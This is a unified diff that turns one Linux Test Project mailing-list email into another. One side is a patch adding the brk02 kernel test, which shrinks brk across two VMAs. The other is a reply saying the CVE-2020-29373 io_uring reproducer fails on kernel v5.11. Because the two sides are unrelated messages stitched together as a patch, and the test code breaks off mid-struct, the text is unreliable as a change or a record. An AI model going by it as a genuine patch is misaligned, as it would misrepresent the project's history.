@@ -2,157 +2,117 @@ Return-Path: <ltp-bounces+lists+linux-ltp=lfdr.de@lists.linux.it>
 X-Original-To: lists+linux-ltp@lfdr.de
 Delivered-To: lists+linux-ltp@lfdr.de
 Received: from picard.linux.it (picard.linux.it [IPv6:2001:1418:10:5::2])
-	by mail.lfdr.de (Postfix) with ESMTPS id 819683186C2
-	for <lists+linux-ltp@lfdr.de>; Thu, 11 Feb 2021 10:19:23 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id DEFAC3186C3
+	for <lists+linux-ltp@lfdr.de>; Thu, 11 Feb 2021 10:19:29 +0100 (CET)
 Received: from picard.linux.it (localhost [IPv6:::1])
-	by picard.linux.it (Postfix) with ESMTP id 2BE383C6CC2
-	for <lists+linux-ltp@lfdr.de>; Thu, 11 Feb 2021 10:19:23 +0100 (CET)
+	by picard.linux.it (Postfix) with ESMTP id A8F2A3C68FC
+	for <lists+linux-ltp@lfdr.de>; Thu, 11 Feb 2021 10:19:29 +0100 (CET)
 X-Original-To: ltp@lists.linux.it
 Delivered-To: ltp@picard.linux.it
-Received: from in-4.smtp.seeweb.it (in-4.smtp.seeweb.it
- [IPv6:2001:4b78:1:20::4])
- by picard.linux.it (Postfix) with ESMTP id 633283C0304
- for <ltp@lists.linux.it>; Tue,  9 Feb 2021 15:37:14 +0100 (CET)
-Received: from userp2130.oracle.com (userp2130.oracle.com [156.151.31.86])
- (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from in-7.smtp.seeweb.it (in-7.smtp.seeweb.it [217.194.8.7])
+ by picard.linux.it (Postfix) with ESMTP id 470823C288B
+ for <ltp@lists.linux.it>; Wed, 10 Feb 2021 20:36:35 +0100 (CET)
+Received: from mail-wm1-x32a.google.com (mail-wm1-x32a.google.com
+ [IPv6:2a00:1450:4864:20::32a])
+ (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
+ key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
  (No client certificate requested)
- by in-4.smtp.seeweb.it (Postfix) with ESMTPS id 4BD271000AF8
- for <ltp@lists.linux.it>; Tue,  9 Feb 2021 15:37:13 +0100 (CET)
-Received: from pps.filterd (userp2130.oracle.com [127.0.0.1])
- by userp2130.oracle.com (8.16.0.42/8.16.0.42) with SMTP id 119EUY85030343
- for <ltp@lists.linux.it>; Tue, 9 Feb 2021 14:37:10 GMT
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com;
- h=from : to : cc :
- subject : date : message-id : references : in-reply-to : content-type :
- content-transfer-encoding : mime-version; s=corp-2020-01-29;
- bh=NIKhj5bK45t3QYz5w0X2nsXT3zYR3/kd/acwXeCzLXo=;
- b=B9247v+RCjG11PFj015/SMb3oK/jVl3Gw5UyYUL0MSTCq6l3vH7sdwarXcpdsXwDh4lE
- n91IYH7c71e2q6ZEmiGX5uz2F9A+BvSZ+gGa2cPAbCS9yQjWMYSv9SeZzL/BUKIFTU7n
- 74y9WE64UIpLcbsu62T7uEfEL28BYasOM9zcAEV5xd4vRsaucSnUe8r+AjvHy9mEhHnO
- lo6Qvd7YGT7/x8520XP/gfr80+kbAZhIYlUlzNZ92WWYPezpUIM5/32mzL09LpXy8+5s
- 0bZ8k3HrzWNbLJ76Y6xnj9gUJ+XDR7oBnGmYGc36GGDq4/HBxFp/5D93yYwj5OzEoare qg== 
-Received: from userp3020.oracle.com (userp3020.oracle.com [156.151.31.79])
- by userp2130.oracle.com with ESMTP id 36hjhqqpdt-1
- (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK)
- for <ltp@lists.linux.it>; Tue, 09 Feb 2021 14:37:10 +0000
-Received: from pps.filterd (userp3020.oracle.com [127.0.0.1])
- by userp3020.oracle.com (8.16.0.42/8.16.0.42) with SMTP id 119EUhmP010965
- for <ltp@lists.linux.it>; Tue, 9 Feb 2021 14:37:10 GMT
-Received: from nam10-bn7-obe.outbound.protection.outlook.com
- (mail-bn7nam10lp2104.outbound.protection.outlook.com [104.47.70.104])
- by userp3020.oracle.com with ESMTP id 36j4vrd76u-2
- (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK)
- for <ltp@lists.linux.it>; Tue, 09 Feb 2021 14:37:09 +0000
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
- b=jCGOAhSD0fDTMvEwEdrvjl72jsU0yHmfvAblfO8d1KiiDP1ofbanF3bjbGkv/WjQLOd5DnPf99IPCcaOR2GSp3SPYTMyvOqfngVYM4ZEhj/I3CFqmUiaIbteKFWN8XlERi64gG9ewHhqbM9tUoabQAJ1CySxYiEdWi/V4fomQ1wZUP3hmnojjQ3UIlKdeXinJXcyK2TDdBHzX0JJ8CCwmLsWMLvGQT4GFrXv5pHngSyHbEIS5oYP8a5Wg4sdAxDzrNRrPVFGLmGdj/h+SXJ+mkObTYJitlM2fCmeYJXcnjUNB7wUH8cVflq6wH+YBQYflmk/PoeY4HY+Bx7uWethRw==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com; 
- s=arcselector9901;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=NIKhj5bK45t3QYz5w0X2nsXT3zYR3/kd/acwXeCzLXo=;
- b=CSb0PQsE5bqNn7t2YCRe4sZyhLpogmMjZU+8OJYMdHYaTAlPPJWA/uriyJZofofd2U/3rQpaKpN4URpRepR6scPeZYUT6OG/6PY7nDmioFOvVW5Owv5iHQq4wdvGrT/lxqO1WdP2SEKTb/ENs/A4folKAPMwJ0qkm6LXrztbC/UHKvh18fwT1/XFGuBnghVvwkr+lxA2IU7ZjVo2tCQKGm+lkC0W27cSLEyvOcTjYnOTr2CpLc8VxrX3WShtUXlnM76icGJVp40zOE0zIQH150/1SXFQKaXPCZp5+VTuTi+ZHHq5o7uiGMJ2Kh0sPkNcFUaDNKCCZbb2Z3s5OLSXrA==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
- dkim=pass header.d=oracle.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=NIKhj5bK45t3QYz5w0X2nsXT3zYR3/kd/acwXeCzLXo=;
- b=fSfdb2rOc+OfQbd7rmPwnQmzTeohHFj27qbNmVvqBCymOxC//KUkUcVzXVNvgTOH3tjydMYkQFn4JsTgofKXiZA0XR3Bp27oE1tletth28ed27ebrutK1EUpWZj0lKGwyfIXFN2EUPUvmFpLDVYUzwYeeoLvKLagwSROCsuYbOY=
-Received: from MWHPR10MB1582.namprd10.prod.outlook.com (2603:10b6:300:22::8)
- by MWHPR1001MB2126.namprd10.prod.outlook.com (2603:10b6:301:30::19) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.3805.19; Tue, 9 Feb
- 2021 14:37:05 +0000
-Received: from MWHPR10MB1582.namprd10.prod.outlook.com
- ([fe80::cd32:6bce:ab18:83a]) by MWHPR10MB1582.namprd10.prod.outlook.com
- ([fe80::cd32:6bce:ab18:83a%8]) with mapi id 15.20.3825.030; Tue, 9 Feb 2021
- 14:37:05 +0000
-From: Liam Howlett <liam.howlett@oracle.com>
-To: "ltp@lists.linux.it" <ltp@lists.linux.it>
-Thread-Topic: [PATCH 1/1] brk02: Add test for removing more than one VMA
-Thread-Index: AQHW/vEJ2ahBvo0RJE6dlD0EKJ56KQ==
-Date: Tue, 9 Feb 2021 14:37:05 +0000
-Message-ID: <20210209143702.2003038-2-Liam.Howlett@Oracle.com>
-References: <20210209143702.2003038-1-Liam.Howlett@Oracle.com>
-In-Reply-To: <20210209143702.2003038-1-Liam.Howlett@Oracle.com>
-Accept-Language: en-US
-Content-Language: en-US
-X-MS-Has-Attach: 
-X-MS-TNEF-Correlator: 
-authentication-results: lists.linux.it; dkim=none (message not signed)
- header.d=none;lists.linux.it; dmarc=none action=none header.from=oracle.com;
-x-originating-ip: [23.233.25.87]
-x-ms-publictraffictype: Email
-x-ms-office365-filtering-correlation-id: ff55671f-d9a4-4167-df63-08d8cd082c38
-x-ms-traffictypediagnostic: MWHPR1001MB2126:
-x-ms-exchange-transport-forked: True
-x-microsoft-antispam-prvs: <MWHPR1001MB21260C4A8EC340BE74C8405AFD8E9@MWHPR1001MB2126.namprd10.prod.outlook.com>
-x-ms-oob-tlc-oobclassifiers: OLM:3383;
-x-ms-exchange-senderadcheck: 1
-x-microsoft-antispam: BCL:0;
-x-microsoft-antispam-message-info: TIMC9t4DW3geocEuuFYNT2wV4knAeWDQzF8jobP2EmieaVqvqk2JW56i2k9E4kvX5DQZ+skFLiDSiDs5Qb0AvIcEzWVTeKbgPpn5cn7r/rVmhr35WG6jdMZMFFJQ4Q4nd+XANpb9H1dINjmm1b32t/9+Y1+gNT+tpqI/qGdbTdNxIfDdIsuDor4QSruOnBnUXJWqujhzb2KkoBxi/pMpGC4YEfBMus2ET/opqKBEWy1d2THlLjv2SU909fL29Gu5OutDcp4oKnVVcMnpO14L+zVkZl3DT2ZCsIb/s373bibXPVWIid9GqhjOa5cefufopY9QsugyQ4vW3zU4Mf+mXj5EPs5Zg5UGEr9dUVMZOmCdRV+w9eeq/1FjsBVgC99fhT4M7ynLHB9IEf34yIGJc+XJnGszbnJEILWh9OSk7FQOfJUZ3xoIN+214Nztd97DZ5yH/qnyvfDhjvOTzkNE1UunkSN06NegT58IzZtl6fMg91j/BYSJ3ix1q1GNsVzCZN8J5P9BIpOfAMHXpY1GtA==
-x-forefront-antispam-report: CIP:255.255.255.255; CTRY:; LANG:en; SCL:1; SRV:;
- IPV:NLI; SFV:NSPM; H:MWHPR10MB1582.namprd10.prod.outlook.com; PTR:; CAT:NONE;
- SFS:(136003)(376002)(366004)(346002)(39860400002)(396003)(478600001)(2616005)(83380400001)(6486002)(316002)(6916009)(4326008)(186003)(36756003)(66476007)(2906002)(64756008)(66556008)(66446008)(6512007)(66946007)(76116006)(91956017)(71200400001)(44832011)(1076003)(107886003)(8936002)(86362001)(6506007)(5660300002)(8676002)(26005);
- DIR:OUT; SFP:1101; 
-x-ms-exchange-antispam-messagedata: =?iso-8859-1?Q?NfodCH8ohyVGd1cSpV6LJJdMil+6PgBSLvC0BP7oMTTS5ljATy2k7ZE6sx?=
- =?iso-8859-1?Q?c2yrCjzUguJn10onuEIF7xXG2Otrihgi5YmQrX7weh6ss+wLGKpolvdzgh?=
- =?iso-8859-1?Q?GQbBNzoYYsCzJxSOyxxX0T52Zd19wJzphyL6CpcD8lbH60OLxuvg1DfAwj?=
- =?iso-8859-1?Q?b7vwx/GQkTUiPEIkbG6lStCxJdTpoFItv4TsFK0unjuEqBM3NYT4DKtd5/?=
- =?iso-8859-1?Q?DUS7cbsrYLeQKINwlJZjD1aQd74EXPlQEkPdqEMwdvp87MnAOXq07PAfil?=
- =?iso-8859-1?Q?zygRxFkUJ3xzjsLzIbBdovZH3mZVnopE3fV9y7mMvnSwuedS2cAxgLYdjW?=
- =?iso-8859-1?Q?joDCH9C2knhXKaWsnpKzRtsa0u3zmghMt32wsnP74Ba3zUEPUlQVPi5Eus?=
- =?iso-8859-1?Q?4sVVvayE2lucUuml4zjuPnei7XDAswKjui+B98lGFKjdeR3AZ35eP8JwFm?=
- =?iso-8859-1?Q?5YTpAW1qqnwL5ERMI8UF/Z57Wvre8ea4Y2GI/Lozr35LOwT6BtZHCVc3B9?=
- =?iso-8859-1?Q?v3DmucExfCOfD3s7fPLSayWpuXZrmSurpMNOsXTWGJMh6DQOhEbI/Aw6rV?=
- =?iso-8859-1?Q?pK6pbaEbKyqTxsVe+0bzSkHm/gStdypLTO9EIcHF+cWd3AEZySqFIRG1gM?=
- =?iso-8859-1?Q?mypR35ouWVXZuLZgqEwvgkd4uLkCq+Jeuf7EXwjjPoBjrAEHi6RQ/7hlYg?=
- =?iso-8859-1?Q?fhbS4N9m5Oi1ucGNPpq26zUL9dsN9Xkak+JQ0JWknS5m9eN+kSta996wDO?=
- =?iso-8859-1?Q?ckGXQH92cUu/w/Rb7X6d3h7jDoVL2SGvcn0ZPvRbVjUjyqWPyHiHbGkv6V?=
- =?iso-8859-1?Q?3H1K2DgUtJYJv1MHsB8o/KyO4ZK3WrwxW+RbJrbg7caJXvLApopwYiYzP0?=
- =?iso-8859-1?Q?FzvHeF9+o/djPYjQwlpXT7NetlCl9DK3EeSEG0El25N4nllYNffEcB9eja?=
- =?iso-8859-1?Q?yrEr8EYFl1aPd/KTeD9FOKgWrDHiKs0a+Jp5jFwDAJy3Stn0Sildd3nkEg?=
- =?iso-8859-1?Q?h0VxcUDSc0++A/qcwms8Ro3FLNvdvZN8sQ6So5Ug6LQyFD3TPeTMvneUPn?=
- =?iso-8859-1?Q?VdRmuCZWQj5uu8wFNJf/xAwWnDjQ6Yca7EgBelpT8C5JdNzx4vsR+wIAoW?=
- =?iso-8859-1?Q?zSe2wNGa8/U8ZCwc26W50qZR1bazVPTdHVxZGp83J6AH0iDSjbmKEUUntN?=
- =?iso-8859-1?Q?DpyF0rw992lmjxGlFXPCnIt2n0qOA5q4id7OUOccn1r/g0fGOOzVIqF2n/?=
- =?iso-8859-1?Q?y6H0EL6/WhI3j/tGoaRSpA7UuT5FErJRoNRBjWOntzebXLgaUo5L1T3XkW?=
- =?iso-8859-1?Q?LVSTnbJZLRE1iNJOvoRC0iCxGFguXrKW+oUQd/zEG85aV7cidHuDbU4DkV?=
- =?iso-8859-1?Q?yuQaF3NiT4?=
+ by in-7.smtp.seeweb.it (Postfix) with ESMTPS id 6E8CA20009A
+ for <ltp@lists.linux.it>; Wed, 10 Feb 2021 20:36:34 +0100 (CET)
+Received: by mail-wm1-x32a.google.com with SMTP id l17so1272965wmq.2
+ for <ltp@lists.linux.it>; Wed, 10 Feb 2021 11:36:34 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20161025;
+ h=subject:to:cc:references:from:autocrypt:message-id:date:user-agent
+ :mime-version:in-reply-to:content-language:content-transfer-encoding;
+ bh=2BBWPOADlaI9skyGqRhLCyu5YWKv1IKA4aGtM6CfFE8=;
+ b=E6ujWdXbkChdBBzR5G31Lqp9Y+4IaHUXV79pkGd3H/5I78jbz9scWTrkDNg08ZsY3Z
+ HkHBD1Y2IhxexpQSyefXa4cpoGWAdXQp5ZCR3jXsyUtEfvYjf9kwGBuYj+9u9pnGnie0
+ qhqx/bsmhnfyCnAuvsl7rA46bGUQ84xXl5qaYZrUMOKSlDIZmUa53thENFcrUALdBe9G
+ VfwbA/G4fIrJKkWnjDigZ3S4icliFYJnSAn7qQaSZ+IagUVgMQZbuWgnu1CKL694cH3h
+ Zv9M75/t1IHyGOIJvrRBu9doF46BHOgYITQEYIa/xXWE79LzU1D7I/Da6oU3Ycm7X181
+ a5YA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=1e100.net; s=20161025;
+ h=x-gm-message-state:subject:to:cc:references:from:autocrypt
+ :message-id:date:user-agent:mime-version:in-reply-to
+ :content-language:content-transfer-encoding;
+ bh=2BBWPOADlaI9skyGqRhLCyu5YWKv1IKA4aGtM6CfFE8=;
+ b=qzyN+eFyETrP5n2yD3hVsHy3gfVuPeEcpdvrO0Ysajr+1QYi7UnE5F3H1xzyS2Q8Di
+ AIDfVH2cLWSWUVLdNThDOldK7RTAxavHLmlNmmY8H4LmIuxmTfxw8bNliCtvhonGvEO6
+ PS2kcH9g/dDoKO3bKFBiDpKKyKJP6S5puKc0t0mcRBcAz8NfSiG3hNx5FgH/IaiI2nyo
+ K0hjbu4zUgPkyQmD1J6ykngNt0VStXXKHyVH4TIzETXRlKvMD6oj4m8X4jsat66T+E73
+ pR2ETC4UG6sdAc9RqTbdlRa7Rmifz5q75Bx7ZN0cx+j03xgfKVDfS6lp6Xx8scd8/9xF
+ JzNQ==
+X-Gm-Message-State: AOAM5312cwxY00cPHAuYY/sr//dNxstQuZkDgorJk+wdaWW+NTBxyQQV
+ nKgHiBxupt9frQNH3c67B5KWgSWKMJg7Ww==
+X-Google-Smtp-Source: ABdhPJzFhBdWsxilTC+eOQ0oFlcvx2ht3NkoDEs1mAARUrXIPXPVcCHyuEi6l9rfoGW2KDpkgN1j3w==
+X-Received: by 2002:a1c:f417:: with SMTP id z23mr533742wma.29.1612985793635;
+ Wed, 10 Feb 2021 11:36:33 -0800 (PST)
+Received: from [192.168.8.194] ([148.252.132.126])
+ by smtp.gmail.com with ESMTPSA id h14sm3887677wmq.45.2021.02.10.11.36.32
+ (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
+ Wed, 10 Feb 2021 11:36:33 -0800 (PST)
+To: Petr Vorel <pvorel@suse.cz>, io-uring@vger.kernel.org
+References: <YCQvL8/DMNVLLuuf@pevik>
+From: Pavel Begunkov <asml.silence@gmail.com>
+Autocrypt: addr=asml.silence@gmail.com; prefer-encrypt=mutual; keydata=
+ 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 bA==
+Message-ID: <b74d54ed-85ba-df4c-c114-fe11d50a3bce@gmail.com>
+Date: Wed, 10 Feb 2021 19:32:46 +0000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
+ Thunderbird/68.3.0
 MIME-Version: 1.0
-X-OriginatorOrg: oracle.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-AuthSource: MWHPR10MB1582.namprd10.prod.outlook.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: ff55671f-d9a4-4167-df63-08d8cd082c38
-X-MS-Exchange-CrossTenant-originalarrivaltime: 09 Feb 2021 14:37:05.2155 (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
-X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: ABh10sT2+JpC3dNRiEta8XmT1vuaGxfc98bgwgpctEbtexA+Ot6BFMIm3WQIelYpot75A6/4HSIs4AZenZ9dog==
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: MWHPR1001MB2126
-X-Proofpoint-Virus-Version: vendor=nai engine=6200 definitions=9889
- signatures=668683
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 bulkscore=0
- adultscore=0
- mlxlogscore=967 mlxscore=0 suspectscore=0 malwarescore=0 phishscore=0
- spamscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.12.0-2009150000 definitions=main-2102090075
-X-Proofpoint-Virus-Version: vendor=nai engine=6200 definitions=9889
- signatures=668683
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 malwarescore=0
- impostorscore=0
- priorityscore=1501 bulkscore=0 suspectscore=0 mlxscore=0 phishscore=0
- lowpriorityscore=0 mlxlogscore=999 clxscore=1015 spamscore=0 adultscore=0
- classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2009150000
- definitions=main-2102090075
-X-Virus-Scanned: clamav-milter 0.102.4 at in-4.smtp.seeweb.it
+In-Reply-To: <YCQvL8/DMNVLLuuf@pevik>
+Content-Language: en-US
+X-Virus-Scanned: clamav-milter 0.102.4 at in-7.smtp.seeweb.it
 X-Virus-Status: Clean
-X-Spam-Status: No, score=0.1 required=7.0 tests=DKIM_SIGNED,DKIM_VALID,
- DKIM_VALID_AU,DKIM_VALID_EF,SPF_HELO_PASS,SPF_PASS autolearn=disabled
- version=3.4.4
-X-Spam-Checker-Version: SpamAssassin 3.4.4 (2020-01-24) on in-4.smtp.seeweb.it
-X-Mailman-Approved-At: Thu, 11 Feb 2021 10:19:10 +0100
-Subject: [LTP] [PATCH 1/1] brk02: Add test for removing more than one VMA
+X-Spam-Status: No, score=-0.2 required=7.0 tests=DKIM_SIGNED,DKIM_VALID,
+ DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_FROM,NICE_REPLY_A,SPF_HELO_NONE,
+ SPF_PASS autolearn=disabled version=3.4.4
+X-Spam-Checker-Version: SpamAssassin 3.4.4 (2020-01-24) on in-7.smtp.seeweb.it
+X-Mailman-Approved-At: Thu, 11 Feb 2021 10:19:09 +0100
+Subject: Re: [LTP] CVE-2020-29373 reproducer fails on v5.11
 X-BeenThere: ltp@lists.linux.it
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -164,82 +124,402 @@ List-Post: <mailto:ltp@lists.linux.it>
 List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
 List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
  <mailto:ltp-request@lists.linux.it?subject=subscribe>
-Cc: Liam Howlett <liam.howlett@oracle.com>
+Cc: Jens Axboe <axboe@kernel.dk>, ltp@lists.linux.it,
+ Nicolai Stange <nstange@suse.de>, Bjorn Andersson <bjorn.andersson@linaro.org>
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 Errors-To: ltp-bounces+lists+linux-ltp=lfdr.de@lists.linux.it
 Sender: "ltp" <ltp-bounces+lists+linux-ltp=lfdr.de@lists.linux.it>
 
-When brk expands, it attempts to expand a VMA.  This expansion will
-succeed depending on the anonymous VMA chain and if the vma flags are
-compatible.  This test expands brk() then calls mprotect to ensure the
-next brk call will create a new VMA, then it calls brk a final time to
-restore the first brk address.  The test is the final brk call which
-will remove more than an entire VMA from the vm area.
+On 10/02/2021 19:08, Petr Vorel wrote:
+> Hi all,
+> 
+> I found that the reproducer for CVE-2020-29373 from Nicolai Stange (source attached),
+> which was backported to LTP as io_uring02 by Martin Doucha [1] is failing since
+> 10cad2c40dcb ("io_uring: don't take fs for recvmsg/sendmsg") from v5.11-rc1.
 
-Signed-off-by: Liam R. Howlett <Liam.Howlett@Oracle.com>
----
- testcases/kernel/syscalls/brk/brk02.c | 49 +++++++++++++++++++++++++++
- 1 file changed, 49 insertions(+)
- create mode 100644 testcases/kernel/syscalls/brk/brk02.c
+Thanks for letting us know, we need to revert it
 
-diff --git a/testcases/kernel/syscalls/brk/brk02.c b/testcases/kernel/syscalls/brk/brk02.c
-new file mode 100644
-index 000000000..834fe9f2f
---- /dev/null
-+++ b/testcases/kernel/syscalls/brk/brk02.c
-@@ -0,0 +1,49 @@
-+// SPDX-License-Identifier: GPL-2.0-or-later
-+/*
-+ * Copyright (c) 2021 Liam R. Howlett <liam.howlett@oracle.com>
-+ *
-+ *  
-+ *  Expand the brk by 2 pages to ensure there is a newly created VMA and not
-+ *  expanding the original due to multiple anon pages.  mprotect that new VMA
-+ *  then brk back to the original address therefore causing a munmap of at
-+ *  least one full VMA.
-+ */
-+
-+#include <unistd.h>
-+#include <stdint.h>
-+#include <sys/mman.h>
-+
-+#include "tst_test.h"
-+
-+void brk_down_vmas(void)
-+{
-+	void *brk_addr = sbrk(0);
-+	unsigned long page_size = getpagesize();
-+	void *addr = brk_addr + page_size;
-+
-+	if (brk(addr))
-+		return;
-+
-+	addr += page_size;
-+	if (brk(addr))
-+		return;
-+
-+	if (mprotect(addr - page_size, page_size,
-+			PROT_READ|PROT_WRITE|PROT_EXEC))
-+		return;
-+
-+	addr += page_size;
-+	if (brk(addr))
-+		return;
-+
-+	if (brk(brk_addr))
-+		return;
-+
-+
-+
-+	tst_res(TPASS, "munmap two VMAs of brk() passed.");
-+}
-+
-+static struct tst_test test = {
